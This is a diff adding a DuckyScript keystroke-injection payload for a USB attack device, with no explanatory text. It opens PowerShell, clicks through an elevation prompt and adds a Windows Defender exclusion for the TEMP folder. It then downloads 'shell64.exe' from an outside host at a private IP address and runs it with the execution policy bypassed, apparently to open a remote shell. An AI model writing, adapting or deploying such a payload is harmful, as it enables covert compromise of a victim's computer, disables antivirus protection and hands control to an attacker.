@@ -1,0 +1,45 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 2000
+STRING Start-Process powershell -Verb RunAs
+ENTER
+DELAY 2000
+TAB
+TAB
+ENTER
+DELAY 1000
+
+REM -- Add Defender exclusion for TEMP folder
+STRING Add-MpPreference -ExclusionPath "$env:TEMP"
+ENTER
+DELAY 1000
+
+REM -- Set URL and path for download
+STRING $url = "http://172.17.88.70:8000/shell64.exe"
+ENTER
+STRING $filepath = "$env:TEMP\shell64.exe"
+ENTER
+
+REM -- Download the payload
+STRING (New-Object System.Net.WebClient).DownloadFile($url, $filepath)
+ENTER
+DELAY 500
+STRING EXIT
+ENTER
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -ep bypass -c "Start-Process \"$env:TEMP\shell64.exe\"
+ENTER
+DELAY 500
+STRING EXIT
+ENTER
+DELAY 2000
+ALT F4
+
+
+
